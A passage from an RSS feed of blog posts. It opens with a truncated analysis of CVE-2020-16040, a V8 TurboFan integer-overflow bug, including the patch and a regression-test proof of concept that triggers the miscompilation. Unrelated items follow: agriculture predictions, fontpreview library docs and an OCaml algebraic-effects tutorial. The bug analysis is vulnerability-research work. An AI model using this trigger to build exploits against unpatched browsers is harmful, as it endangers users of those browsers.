<p>Before actually starting to analyze the bug, it is helpful to have some background knowledge of V8 and TurboFan. In this case, having some knowledge of how TurboFan works, and more specifically knowledge of how the Simplified Lowering Phase works would be extremely helpful.</p>

<p><a href="https://twitter.com/__x86">Jeremy Fetiveau (@__x86)</a> recently <a href="https://doar-e.github.io/blog/2020/11/17/modern-attacks-on-the-chrome-browser-optimizations-and-deoptimizations/">wrote a blog post that I would highly recommend</a>. It has a section that talks about how the Simplified Lowering Phase works in TurboFan. There are also a few other blog posts on that same blog (as well as online elsewhere) that cover topics like TurboFan’s typer, and etc.</p>

<p>Although I’ll try to explain everything that’s required to understand this specific bug, feel free to refer to other resources to understand what I’m trying to say. Information about complex topics is often really difficult to relay in a manner that’s comprehensible by everyone.</p>

<p><strong>It is also highly recommended that you follow along somehow by reading a lot of the code yourself on your local machine. It’s impossible for me to show every single bit of code that’s needed to get the right information across to everyone, so it will be useful to be able to refer to the code whenever you are confused about anything.</strong></p>



<p>The first thing that I always do when analyzing any bug is to gather all the information that I initially have, and try to come up with some exploratory questions that I’ll hopefully be able to answer after I’m done with my analysis. The exploratory nature of the questions should force me to really read a lot of code to come up with the answers.</p>

<p>How does this apply to this bug? Well, for starters, we have the patch, a commit message, and regression test. The regression test especially is very useful. If I didn’t have the regression test handy, then the first thing I’d do is try to figure out how to trigger the bug (which is easier said than done with something as complex as V8 / TurboFan). Since we have the regression test in this case though, I’ll just leave the whole “how to come up with a proof of concept” for another blog post.</p>

<p>Looking at the commit message, we see that it states the following:</p>

<div><div><pre><code>[compiler] Fix a bug in SimplifiedLowering

SL's VisitSpeculativeIntegerAdditiveOp was setting Signed32 as restriction type even when 
relying on a Word32 truncation in order to skip the overflow check. This is not sound.
</code></pre></div></div>

<p>By itself, without any prior knowledge about the Simplified Lowering Phase, this might be difficult to understand. We do know that the patch modified a function called <code>VisitSpeculativeIntegerAdditiveOp</code>, and that it has a nice comment that provides a bit more information:</p>

<div><div><pre><code><span>+    // Using Signed32 as restriction type amounts to promising there won't be
+    // signed overflow. This is incompatible with relying on a Word32
+    // truncation in order to skip the overflow check.
+    Type const restriction =
+        truncation.IsUsedAsWord32() ? Type::Any() : Type::Signed32();
</span></code></pre></div></div>

<p>Right here, we have a few different terms such as “restriction type”, “Word32 truncation”, etc, that we have to learn about, but it should be pretty logical to conclude that the effect of the bug is this: the engine makes a promise and says that a signed integer overflow will not take place, but the actual outcome is that a signed integer overflow <em>does</em> take place.</p>

<p>Knowing this, let’s have a look at the regression test now. I added my own <code>assertTrue</code> and <code>assertFalse</code> functions to it so that I could actually run it (I believe ClusterFuzz does this automatically). Here is the modified poc:</p>

<div><div><pre><code><span>// Copyright 2020 the V8 project authors. All rights reserved.</span>
<span>// Use of this source code is governed by a BSD-style license that can be</span>
<span>// found in the LICENSE file.</span>

<span>// Flags: --allow-natives-syntax</span>

<span>function</span> <span>assertTrue</span><span>(</span><span>c</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>!</span><span>c</span><span>)</span> <span>{</span> <span>throw</span> <span>"</span><span>Assertion failed</span><span>"</span><span>;</span> <span>}</span>
<span>}</span>

<span>function</span> <span>assertFalse</span><span>(</span><span>c</span><span>)</span> <span>{</span>
    <span>assertTrue</span><span>(</span><span>!</span><span>c</span><span>);</span>
<span>}</span>

<span>function</span> <span>foo</span><span>(</span><span>a</span><span>)</span> <span>{</span>
  <span>var</span> <span>y</span> <span>=</span> <span>0x7fffffff</span><span>;</span>  <span>// 2^31 - 1</span>

  <span>// Widen the static type of y (this condition never holds).</span>
  <span>if</span> <span>(</span><span>a</span> <span>==</span> <span>NaN</span><span>)</span> <span>y</span> <span>=</span> <span>NaN</span><span>;</span>

  <span>// The next condition holds only in the warmup run. It leads to Smi</span>
  <span>// (SignedSmall) feedback being collected for the addition below.</span>
  <span>if</span> <span>(</span><span>a</span><span>)</span> <span>y</span> <span>=</span> <span>-</span><span>1</span><span>;</span>

  <span>const</span> <span>z</span> <span>=</span> <span>(</span><span>y</span> <span>+</span> <span>1</span><span>)</span><span>|</span><span>0</span><span>;</span>
  <span>return</span> <span>z</span> <span>&lt;</span> <span>0</span><span>;</span>
<span>}</span>

<span>%</span><span>PrepareFunctionForOptimization</span><span>(</span><span>foo</span><span>);</span>
<span>assertFalse</span><span>(</span><span>foo</span><span>(</span><span>true</span><span>));</span>
<span>%</span><span>OptimizeFunctionOnNextCall</span><span>(</span><span>foo</span><span>);</span>
<span>assertTrue</span><span>(</span><span>foo</span><span>(</span><span>false</span><span>));</span>
</code></pre></div></div>

<p>Looking at the code itself, we can quickly determine the following about the function <code>foo</code>:</p>

<ol>
  <li>A variable <code>y</code> is set to <code>0x7fffffff</code>, which is <code>INT_MAX</code>.</li>
  <li>Some TurboFan specific stuff is done which allows the bug to be triggered (we’ll get into all of this later).</li>
  <li>A variable <code>z</code> is set to <code>(y + 1)|0</code>.</li>
  <li>The return statement is supposed to return <code>false</code> for the first call to <code>foo</code> (The argument <code>a</code> will be <code>true</code>, so <code>y</code> will be set to <code>-1</code>, which will cause <code>z</code> to be set to <code>y+1 == -1+1 == 0</code>), which it does correctly.</li>
  <li>For the second call to <code>foo</code>, <code>a</code> will be <code>false</code>, so <code>z</code> will be set to <code>y+1 == 0x7fffffff+1 == 0x80000000</code>. Based on the regression test, it seems this addition should yield the negative number <code>-2147483648</code>, which should cause the function to return <code>true</code> as this negative number is less than 0.</li>
  <li>However, if you run this regression test, you’ll see that the final <code>assertTrue</code> will fail. We can conclude that the bug supposedly causes the engine to incorrectly assume that an integer overflow hasn’t occurred, when in fact it has (we haven’t verified yet that it has, but we will later).</li>
</ol>

<p>Based on this information, I came up with the following questions that I will need to have answered after I’ve finished analyzing the bug:</p>

<ul>
  <li>
    <p>The “static type” of <code>y</code> is widened initially. The question is, how does this work? What is the “static type”, and why does it need to be widened here?</p>
  </li>
  <li>
    <p>In the warmup run (i.e the initial call to <code>foo</code>), <code>SignedSmall</code> feedback is collected by setting <code>y</code> to <code>-1</code>. Again, why is this required here? How does this specific line of code collect <code>SignedSmall</code> feedback?</p>
  </li>
  <li>
    <p>Why is <code>z</code> set to <code>(y + 1)|0</code>? More specifically, why is it bitwise OR’d with <code>0</code>?</p>
  </li>
</ul>

<p>These are the three questions I started with. It’s these questions that help give me a goal to work towards. Even though I had the initial goal of “analyse and understand this bug”, it’s not as achievable because it’s so broad. Specific questions like these allow me to focus on one thing at a time, and as I figure out the answers, I’ll slowly figure out the bug itself, which is the real end goal here.</p>



<p>Before I started with answering the questions though, I wanted to quickly compare the Turbolizer graphs between the unpatched and patched versions of V8 to see exactly what effect the patch had on the engine. I won’t go into detail about how to use Turbolizer as there are many blog posts and guides out there.</p>

<p>When I looked at the graphs, I noted that the graphs looked the exact same during the Escape Analysis phase (which runs right before the Simplified Lowering Phase). I’ll only be showing the relevant parts of the graph here.</p>

<p>Escape Analysis Phase:</p>

<p><img src="https://faraz.faith/images/cve-2020-16040/1.png" alt=""></p>

<p>A difference in the graph only shows in the Simplified Lowering Phase. Here are the Simplified Lowering phases of both versions:</p>

<p>Unpatched Simplified Lowering Phase:</p>

<p><img src="https://faraz.faith/images/cve-2020-16040/2.png" alt=""></p>

<p>Patched Simplified Lowering Phase:</p>

<p><img src="https://faraz.faith/images/cve-2020-16040/3.png" alt=""></p>

<p>It’s immediately evident that the <code>NumberLessThan</code> node from the Escape Analysis Phase has been changed to a <code>Uint32LessThan</code> node in the unpatched version’s Simplified Lowering Phase, whereas it has been changed to an <code>Int32LessThan</code> node in the patched version’s Simplified Lowering Phase.</p>

<p>This node is used for the final <code>return z &lt; 0</code> comparison. Presumably, the <code>Uint32LessThan</code> node means that TurboFan has failed to notice the integer overflow that occurs during the addition, as it attempts to compare the two numbers as unsigned 32-bit integers.</p>

<p>In contrast, the patched version’s Simplified Lowering Phase will correctly compare the two numbers as signed 32-bit integers using the <code>Int32LessThan</code> node. This is the correct way to do it since the addition does indeed yield a negative number.</p>



<p>At this point, I started ticking the questions off one at a time. The process for this is somewhat tedious, but I just essentially pick one of the questions and do whatever it takes to answer it.</p>

<p>For example, let’s take the first question - <strong>Why is it required to widen the static type of <code>y</code>?</strong></p>

<ol>
  <li>Comment out the line of code that widens the static type of <code>y</code>. Generate a Turbolizer graph with the modified poc, and compare the original Turbolizer graph with it. What differences do you see?</li>
  <li>Trace through the code for both cases, making extensive use of GDB to get debug output (such as to see the nodes’ types, see what execution paths are taken, etc).</li>
  <li>Find the exact point in the code where the …</li></ol></article></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://faraz.faith/2021-01-07-cve-2020-16040-analysis/">https://faraz.faith/2021-01-07-cve-2020-16040-analysis/</a></em></p>]]>
            </description>
            <link>https://faraz.faith/2021-01-07-cve-2020-16040-analysis/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25671152</guid>
            <pubDate>Thu, 07 Jan 2021 14:07:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Predictions for Agriculture 2020s Decade]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25671102">thread link</a>) | @kickout
<br/>
January 7, 2021 | https://thinkingagriculture.io/predictions-for-the-2020s-decade/ | <a href="https://web.archive.org/web/*/https://thinkingagriculture.io/predictions-for-the-2020s-decade/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page">
		<div id="content">

	<div id="primary">
		<main id="main">
			
<article id="post-233" itemtype="https://schema.org/CreativeWork" itemscope="">
	<div>
		
		<!-- .entry-header -->

		
		<div itemprop="text">
			
<p>As the new year turns over, people in all industries have been making predictions about what they think will happen. Predictions are mostly free and fun to do, so I’ll make some decade long predictions since the scale I’m interested and agriculture in general tend to move slower than other industries. Most of these are quantifiable enough to be called success or failure when 2030 rolls around.</p>



<ul><li>Maize production in the United States peaks in first half and then dramatically falls in second half. I predict maize acreage to be somewhere below 50M planted acres in the years 2028 and 2029.</li><li>95% of corn ethanol plants in operation today will shutter due to insolvency and corn ethanol production in 2029 is 1/100 of its 2020 production levels.</li><li>Brazil grows 50% more soybean acres than the United States. Currently, the ratio has been hovering close to 1:1 with rapid gains on the Brazilian side. This ratio will turn to 1.5/1 in favor of our Brazilians friends. I predict acreages in 2029 to be around ~120 million acres planted in Brazil, and ~80 acres planted in the United States .</li><li>Chemical herbicides will be rendered all but useless for maize, soybean, cotton in both the United States and Brazil. This will signal the resurrection of robust public breeding programs for these crops, or the formation of <a rel="noreferrer noopener" href="https://www.cimmyt.org/" data-type="URL" data-id="https://www.cimmyt.org/" target="_blank">CIMMYT</a>-type enterprises. Whatever chemicals are applied, are done using UAVs or level 4-type autonomous machines.</li><li>To fill the void of ineffective chemical herbicides, first generation autonomous weeding robots will hit market at scale in the back half of the decade.</li><li>There will be a severe <a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Soybean_rust" data-type="URL" data-id="https://en.wikipedia.org/wiki/Soybean_rust" target="_blank">soybean rust</a> outbreak in Brazil, devastating production.</li><li>There will be 50M acres of farmland that are enrolled in a ‘Farming as a Service’ program. I take this to mean the farmer will not make a individual decision on anything; they will simply execute a playbook provided by a company designed to maximize profitability. The profitability will be guaranteed up to a level, with any additional gains to be kept by the company.</li><li>There will be ~100M acres (roughly 1/3 of U.S. cropland) that have <span>living plants</span> growing on their soil continuously throughout the calendar year–with minimal effects on the ‘main’ crop. This will be accomplished with optimized cover crop species mechanization and genetics.</li><li>Tesla, Amazon, Google, Microsoft, or Apple starts up (or acquires) an ‘official’ agriculture division.</li><li>Applying fertilizer on crops becomes regulated in the United States. There will be limits on how much (and when) farmers can apply and some old techniques will be banned because of inefficiency. This will be done to protect water quality.</li><li>Sub-Saharan Africa (SSA) doubles the productivity of the crops it currently grows. Only political instability is preventing SSA from competing with the Midwest region of the United States and Brazil.</li><li>Greenhouse (or contained structures) production of leafy green vegetable increases 5x.</li><li>CRISPR-Cas9 edited crops are plagued by worldwide regulatory gridlock. The success stories will be closed supply chains (i.e. farm to table type operations).</li><li>The price for a ton of sequestered carbon <span>on farmland</span> will average $100 dollars (<a rel="noreferrer noopener" href="https://nori.com/" data-type="URL" data-id="https://nori.com/" target="_blank">assuming it’s currently ~$15</a>). There will be millions of acres (of cropland) that fetch $200 per ton.</li><li>The ’boutique’ fruits/vegetable portfolio intensifies (i.e.<a rel="noreferrer noopener" href="https://cosmiccrisp.com/" data-type="URL" data-id="https://cosmiccrisp.com/" target="_blank"> Cosmic Crisp apples</a>, <a rel="noreferrer noopener" href="https://grapery.biz/" data-type="URL" data-id="https://grapery.biz/" target="_blank">cotton candy grapes</a>, sweet mini peppers). Several legacy varieties will completely disappear or are produced at 1 or 2 orders of magnitude lower (e.g Red Delicious apples, Russet potatoes, etc.).</li><li>Alternate meat products (Impossible Burger, Beyond Meat, etc.) won’t exceed 10% of total meat consumption for any year in the 2020s.</li><li>United States <a rel="noreferrer noopener" href="https://www.ers.usda.gov/topics/farm-economy/land-use-land-value-tenure/farmland-value/" data-type="URL" data-id="https://www.ers.usda.gov/topics/farm-economy/land-use-land-value-tenure/farmland-value/" target="_blank">average farmland value</a> exceeds $5,000 per acre. This will be driven by the price paid for carbon sequestration efficiently competing with pasture and annual crop production acres for use. </li></ul>



<p>There are probably dozens more predictions I can make, but predictions are low risk and harmless. It will take serious teams of people to build out these solutions and actually <span>deliver</span> them at the proper scale for agriculture. </p>
		</div><!-- .entry-content -->

					<!-- .entry-meta -->
				</div><!-- .inside-article -->
</article><!-- #post-## -->
		</main><!-- #main -->
	</div><!-- #primary -->

	
	</div><!-- #content -->
</div></div>]]>
            </description>
            <link>https://thinkingagriculture.io/predictions-for-the-2020s-decade/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25671102</guid>
            <pubDate>Thu, 07 Jan 2021 14:02:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Font previews in command line with Python]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25670993">thread link</a>) | @jajjarax
<br/>
January 7, 2021 | https://fontpreview.readthedocs.io/en/latest/ | <a href="https://web.archive.org/web/*/https://fontpreview.readthedocs.io/en/latest/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    
    <nav data-toggle="wy-nav-shift">
      <div>
        <div>
          

          
            <p><a href="#" alt="Documentation Home"> fontpreview
          

          
            
            <img src="https://fontpreview.readthedocs.io/en/latest/_static/fp.png" alt="Logo">
          
          </a></p><p>
                latest
              </p>
            
          

          


          
        </div>

        
        <div data-spy="affix" role="navigation" aria-label="main navigation">
          
            
            
              
            
            
              <p><span>Contents:</span></p>
<ul>
<li><a href="https://fontpreview.readthedocs.io/en/latest/install.html">Installation</a></li>
<li><a href="https://fontpreview.readthedocs.io/en/latest/example.html">Example</a></li>
<li><a href="https://fontpreview.readthedocs.io/en/latest/cli.html">Command line</a></li>
<li><a href="https://fontpreview.readthedocs.io/en/latest/package.html">fontpreview package</a></li>
</ul>

            
          
        </div>
        
      </div>
    </nav>

    <section data-toggle="wy-nav-shift">

      
      <nav aria-label="top navigation">
        
          <i data-toggle="wy-nav-top"></i>
          <a href="#">fontpreview</a>
        
      </nav>


      <div>
        
        <div>
        
          















<div role="navigation" aria-label="breadcrumbs navigation">

  <ul>
    
      <li><a href="#"></a> »</li>
        
      <li>Welcome to fontpreview’s documentation!</li>
    
    
      <li>
        
            
            
              <a href="https://github.com/MatteoGuadrini/fontpreview/blob/master/docs/source/index.rst"> Edit on GitHub</a>
            
          
        
      </li>
    
  </ul>

  
  <hr>
</div>
          <div role="main" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
            
  <div id="welcome-to-fontpreview-s-documentation">

<p><em>fontpreview</em> is a python library, which allows you to create simple and advanced previews of specific fonts.</p>
<p>In addition, the library includes some classes that allow the advanced creation of preview pages of the characters that make up a font.</p>
<div>
<p><span>Contents:</span></p>
<ul>
<li><a href="https://fontpreview.readthedocs.io/en/latest/install.html">Installation</a><ul>
<li><a href="https://fontpreview.readthedocs.io/en/latest/install.html#python">Python</a></li>
<li><a href="https://fontpreview.readthedocs.io/en/latest/install.html#id1">Installation</a></li>
</ul>
</li>
<li><a href="https://fontpreview.readthedocs.io/en/latest/example.html">Example</a><ul>
<li><a href="https://fontpreview.readthedocs.io/en/latest/example.html#fontpreview-example">FontPreview example</a></li>
<li><a href="https://fontpreview.readthedocs.io/en/latest/example.html#fontbanner-example">FontBanner example</a></li>
<li><a href="https://fontpreview.readthedocs.io/en/latest/example.html#fontlogo-example">FontLogo example</a></li>
<li><a href="https://fontpreview.readthedocs.io/en/latest/example.html#fontwall-example">FontWall example</a></li>
<li><a href="https://fontpreview.readthedocs.io/en/latest/example.html#fontpage-example">FontPage example</a></li>
<li><a href="https://fontpreview.readthedocs.io/en/latest/example.html#fontpagetemplate-example">FontPageTemplate example</a></li>
<li><a href="https://fontpreview.readthedocs.io/en/latest/example.html#fontbooklet-example">FontBooklet example</a></li>
<li><a href="https://fontpreview.readthedocs.io/en/latest/example.html#declarative-object-creation">Declarative object creation</a></li>
</ul>
</li>
<li><a href="https://fontpreview.readthedocs.io/en/latest/cli.html">Command line</a><ul>
<li><a href="https://fontpreview.readthedocs.io/en/latest/cli.html#simple-usage">Simple usage</a></li>
<li><a href="https://fontpreview.readthedocs.io/en/latest/cli.html#advanced-usage">Advanced usage</a></li>
</ul>
</li>
<li><a href="https://fontpreview.readthedocs.io/en/latest/package.html">fontpreview package</a><ul>
<li><a href="https://fontpreview.readthedocs.io/en/latest/fontpreview.html">fontpreview modules</a></li>
</ul>
</li>
</ul>
</div>
</div>
<div id="indices-and-tables">

<ul>
<li><p><a href="https://fontpreview.readthedocs.io/en/latest/genindex.html"><span>Index</span></a></p></li>
<li><p><a href="https://fontpreview.readthedocs.io/en/latest/py-modindex.html"><span>Module Index</span></a></p></li>
<li><p><a href="https://fontpreview.readthedocs.io/en/latest/search.html"><span>Search Page</span></a></p></li>
</ul>
</div>


           </div>
           
          </div>
          

        </div>
      </div>

    </section>

  </div></div>]]>
            </description>
            <link>https://fontpreview.readthedocs.io/en/latest/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25670993</guid>
            <pubDate>Thu, 07 Jan 2021 13:53:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Friendship ended with Monads: Testing out Algebraic effects in OCaml]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25670916">thread link</a>) | @matt_d
<br/>
January 7, 2021 | https://gopiandcode.uk/logs/log-bye-bye-monads-algebraic-effects.html | <a href="https://web.archive.org/web/*/https://gopiandcode.uk/logs/log-bye-bye-monads-algebraic-effects.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<article role="article">

<small>
<time datetime="2021-01-01T07:56:45+00:00">January</time>
<time datetime="2021-01-01T07:56:45+00:00">01</time>
<time datetime="2021-01-01T07:56:45+00:00">2021</time>
</small>
<a href="file:///home/kirang/org/html/tags.html#ocaml"><small>#ocaml</small></a>
<a href="file:///home/kirang/org/html/tags.html#effects"><small>#effects</small></a>
<a href="file:///home/kirang/org/html/tags.html#animations"><small>#animations</small></a>
<a href="file:///home/kirang/org/html/tags.html#game"><small>#game</small></a>
<div id="text-orgeddd4fe">
<p>
Recently, I had the pleasure of talking with KC Sivaramakrishnan - one
of the lead developers of the OCaml multicore project - when he came
to NUS to give us a talk on his work on multicore and a potential new
language feature for OCaml: <b>Algebraic effects</b>.  At a high level, the
run-down on algebraic effects is that they can be considered as a sort
of alternative to monads,<sup><a id="fnr.1" href="#fn.1">1</a></sup> however with the key benefit that they
<i>play a lot nicer</i> with existing direct-style code and thus might be a
<i>more fluid</i> and <i>ergonomic</i> tool.  One of my most surprising takeaways
from meeting KC was in realising the significant amount of progress
that had already been made on implementing algebraic effects in
OCaml - in fact, algebraic effects, far from just being a far-off
pipe-dream (cough, modular implicits, cough), are actually at a point
where it is possible (<i>fairly easy even</i>) to play with them right now
(albeit using an experimental fork of the OCaml compiler).
</p>

<p>
Indeed, this is exactly what I have been working on over the past few
weeks - so moved was I by the world of possibilities opened up by this
development, I immediately set about experimenting on inserting
algebraic effects into various OCaml projects that I happened have
handy at the time.  Over the course of these experiments, I ended up
considering the application of algebraic effects to functional game
development, and in the process stumbled upon a rather elegant pattern
for representing animations in a functional style.  In fact, this
pattern actually ended up solving a longstanding issue I was having
with managing the control flow for animations alongside game logic,
and so I think it forms a rather nice setting for exploring the
benefits of algebraic effects, hence this post.
</p>

 


<p>
In the rest of this blog post, I'm going to provide a <i>gentle
introduction</i> to algebraic effects, provided in the context of their
use in implementing <b>functional game animations</b> - we'll look at using
algebraic effects to implement 3 different case studies of <i>relatively
complex</i> animations (see above) for games in a fluid and elegant way.
Hopefully, through exploring these case-studies, you should be able to
gain a better understanding of the pros and cons of algebraic effects
and why they are certainly something to be excited about.
</p>

<p>
The executable code for the entire blog post can be found at:<sup><a id="fnr.2" href="#fn.2">2</a></sup> <a href="https://gitlab.com/gopiandcode/ocaml-game-animations-with-algebraic-effects">https://gitlab.com/gopiandcode/ocaml-game-animations-with-algebraic-effects</a>
</p>
</div>

<div id="outline-container-orgbc783f7">
<h3 id="orgbc783f7">The vision: Functional Game Development</h3>
<div id="text-orgbc783f7">
<p>
While our final code uses a mix of functional and imperative code (as
is idiomatic OCaml style), our journey really begins in the world of
pure functional games.
</p>

<div> 
<p><img src="https://gopiandcode.uk/images/functional_update.png" alt="functional_update.png"></p><div><p> 
Fundamentally, functional games work by separating
the execution of a game into two distinct functions representing the main phases of the game loop:
</p>
<ul>
<li><b>an update function</b> that takes user input and time and updates the state of the world</li>
<li><b>a draw function</b> that displays the current state of the world to the
screen.</li>
</ul>
<p>
The idea here is that while the state of the game may change over time, the individual update and draw functions are pure and referentially transparent, and thus come with all the usual benefits of functional code (modularity and compositionality, reusable code, easier to reason about etc.).
</p></div> 
</div> 


<p>
To see these ideas in practice, suppose we wanted to implement a simple menu for a game:
</p><p><img src="https://gopiandcode.uk/images/a_game_menu.png" alt="a_game_menu.png">
</p> 


<p>
Following the functional approach, we could define the state of our menu as follows:
</p>
<div>
<pre><span>type</span> <span>menu</span> <span>=</span> <span>{</span> selected<span>:</span> int<span>;</span> options<span>:</span> string list<span>;</span> <span>}</span>
</pre>
</div>

<p>
Using this fairly simple state, we can easily
write a pure draw function for the menu as follows:
</p>
<div>
<pre><span>let</span> <span>draw_item</span><span> </span><span>~</span><span>pos </span><span>~</span><span>is_active txt</span> <span>=</span> <span>...</span> <span>(* </span><span>draw an individual menu item </span><span>*)</span>

<span>let</span> <span>draw</span> <span>{</span>selected<span>;</span>options<span>}</span> <span>=</span>
    <span>List.</span>iteri <span>(</span><span>fun</span> <span>ind option</span> <span>-&gt;</span>  
       draw_item <span>~pos</span><span>:</span>ind <span>~is_active</span><span>:(</span>ind <span>=</span> selected<span>)</span> option
    <span>)</span> options
</pre>
</div>

<p>
Similarly, if we wanted to make the menu respond to user inputs, we
can write a functional update operation for the menu as follows:
</p>
<div>
<pre><span>let</span> <span>update</span><span> menu key</span> <span>=</span> 
   <span>let</span> <span>len</span> <span>=</span> length menu.options <span>in</span>
   <span>let</span> <span>next</span><span> pos</span> <span>=</span> <span>(</span>pos <span>+</span> 1<span>)</span> <span>mod</span> len <span>in</span>
   <span>let</span> <span>prev</span><span> pos</span> <span>=</span> <span>(</span>pos <span>-</span> 1 <span>+</span> len<span>)</span> <span>mod</span> len <span>in</span>
   <span>match</span> key <span>with</span>
   <span>|</span> <span>Up</span> <span>-&gt;</span> <span>{</span>menu <span>with</span> selected <span>=</span> next menu.selected<span>}</span>
   <span>|</span> <span>Down</span> <span>-&gt;</span> <span>{</span>menu <span>with</span> selected <span>=</span> prev menu.selected<span>}</span>
</pre>
</div>

<p>
Hooking these all up together, the main loop for our program might then look as follows:
</p>
<div>
<pre><span>let</span> <span>main</span><span> </span><span>()</span> <span>:</span> <span>unit</span> <span>=</span> 
   <span>let</span> <span>rec</span> <span>loop</span><span> menu</span> <span>=</span> 
      draw menu<span>;</span>
      <span>let</span> <span>input</span> <span>=</span> get_input <span>()</span> <span>in</span>
      <span>let</span> <span>menu</span> <span>=</span> update menu input <span>in</span>
      loop menu <span>in</span>
   loop <span>{</span>selected<span>=</span>0<span>;</span> options<span>=[</span><span>"A"</span><span>;</span> <span>"B"</span><span>;</span> <span>"C"</span><span>]}</span>
</pre>
</div>

<p>
And tada! We now have a fully functional menu that <i>dynamically</i>
responds and updates to user inputs, and we were able to do it all
without having to ever dirty our hands with any <b>evil impure code</b>.
</p>

<p><img src="https://gopiandcode.uk/images/functional_menu.png" alt="functional_menu.png">
</p> 


<p>
Functional game development sounds great, right?
</p>
</div>
</div>

<div id="outline-container-orge7daf0a">
<h3 id="orge7daf0a">The challenge: Managing animations</h3>
<div id="text-orge7daf0a">
<p>
The stuff that I presented in the previous section is nothing new -
there are countless prior blog posts and videos on the web that all
describe this style of a game engine, and it paints a very pretty
picture.
</p>

<p>
Unfortunately, I am afraid to say, not all is as it seems in the land
of functional game development, and when you start using this
methodology to develop any kind of <i>non-trivial</i> games, you can quickly
find yourself running into edge-cases, and one <i>particularly nefarious</i>
example of such issues is handling animations.
</p>

<p>
Returning back to our running example of a game menu, suppose we now
wanted to come back and add a <i>simple</i> quality of life feature to our
menu - nothing complex, just a <b>fade-in</b> between states of the menu.
</p>

<p>
In other words, when the user presses a button, there should be small
<b>time-delay</b> as the menu <i>gradually transitions</i> from the original state
to the new one:
</p>

<p><img src="https://gopiandcode.uk/images/functional_animation.png" alt="functional_animation.png"> 
</p> 


<p>
<i>Okay, sure - that's not a complex transformation - so this should be
simple to implement within our framework, right?</i>
</p>

<div> 
<p><img src="https://gopiandcode.uk/images/functional_update_q.png" alt="functional_update_q.png"></p><div> 


<p>
<b>Unfortunately, no.</b>
</p>

<p>
Our methodology so far was based entirely around the assumption that
the update function is <i>pure</i> and <i>stateless</i> and should be called on each
frame of the game.
</p>

<p>
As such, if we were to return a new menu with the next item selected
when the user presses down, the <b>transformation would be immediate</b>
rather than the <i>gradual change</i> we want.
</p>

<p>
<i>So what exactly should we return from our update function then?</i>
</p></div> 
</div> 


<p>
If one were to strictly adhere to the functional game development
paradigm, then one hacky way to achieve this would be to explicitly
track the state of animations in the menu.
</p>

<p>
For example, we can update our definition of menu to be as follows:
</p>
<div>
<pre><span>type</span> <span>time</span> <span>=</span> int
<span>type</span> <span>state</span> <span>=</span> <span>Static</span> <span>of</span> int <span>|</span> <span>MovingBetween</span> <span>of</span> int <span>*</span> int <span>*</span> time
<span>type</span> <span>menu</span> <span>=</span> <span>{</span> selected<span>:</span> state<span>;</span> options<span>:</span> string list<span>;</span> <span>}</span>
</pre>
</div>

<p>
The idea here is that the <code>state</code> type tracks the two possible states of the menu and its animations:
</p>
<ul>
<li>either the animation is complete and the menu is static</li>
<li>or the menu is in the middle of an animation between two states
with some amount of <code>time</code> (in ms) remaining.</li>
</ul>

<p>
With this change, we can then write our update function as follows
(now updated to take an additional time parameter tracking the time
between frames):
</p>
<div>
<pre><span>let</span> <span>update</span><span> menu key delta</span> <span>=</span> 
  <span>let</span> <span>len</span> <span>=</span> length menu.options <span>in</span>
  <span>let</span> <span>next</span><span> pos</span> <span>=</span> <span>(</span>pos <span>+</span> 1<span>)</span> <span>mod</span> len <span>in</span>
  <span>let</span> <span>prev</span><span> pos</span> <span>=</span> <span>(</span>pos <span>-</span> 1 <span>+</span> len<span>)</span> <span>mod</span> len <span>in</span>
  <span>match</span> menu.state <span>with</span>
  <span>|</span> <span>MovingBetween</span> <span>(</span>old_ind<span>,</span>new_ind<span>,</span> remaining<span>)</span> <span>-&gt;</span>
    <span>let</span> <span>remaining</span> <span>=</span> remaining <span>-</span> delta <span>in</span>
    <span>if</span> remaining <span>&lt;</span> 0 <span>(* </span><span>is animation completed? </span><span>*)</span>
    <span>then</span> <span>{</span>menu <span>with</span> selected <span>=</span> <span>Static</span> new_ind<span>}</span> <span>(* </span><span>yes: return to static </span><span>*)</span>
    <span>else</span> <span>{</span>menu <span>with</span> selected <span>=</span> <span>MovingBetween</span> <span>(</span>old_ind<span>,</span> new_ind<span>,</span> remaining<span>)}</span>
  <span>|</span> <span>Static</span> ind <span>-&gt;</span>
    <span>match</span> key <span>with</span> <span>(* </span><span>only process inputs when animations completed </span><span>*)</span>
    <span>|</span> <span>Up</span> <span>-&gt;</span> <span>{</span>menu <span>with</span> selected <span>=</span> <span>MovingBetween</span> <span>(</span>ind<span>,</span> next menu.selected<span>,</span> 100<span>)}</span>
    <span>|</span> <span>Down</span> <span>-&gt;</span> <span>{</span>menu <span>with</span> selected <span>=</span> <span>MovingBetween</span> <span>(</span>ind<span>,</span> prev menu.selected<span>,</span> 100<span>)}</span>
</pre>
</div>
<p>
So this will work decently well, however, we're now starting to mix
our animation code with the logic of the program, making it harder to
understand and also more probable for bugs to creep in.  Additionally,
while this happens to work for our simple example, the pattern isn't
scalable - adding more animations would require rewriting the entire
function.
</p>

<p>
Clearly, taking this purely functional approach to games development
has some <b>serious difficulties</b> with managing animations, but it would
be unfair to say that this is uniquely due to the functional
approach:
</p>

<p><b><i>The challenge of balancing animations flow with logic is inherent to the domain</i></b>
</p>


<p>
For the rest of this blog post, we'll shift gears to investigate how
algebraic effects can be used to implement animations when dealing
with a slightly more imperative game structure, however this is mainly
to simplify the implementation: the core ideas presented below can be
easily ported to a pure implementation.
</p>
</div>
</div>

<div id="outline-container-org0873648">
<h3 id="org0873648">Algebraic effects to the rescue</h3>
<div id="text-org0873648">
<p>
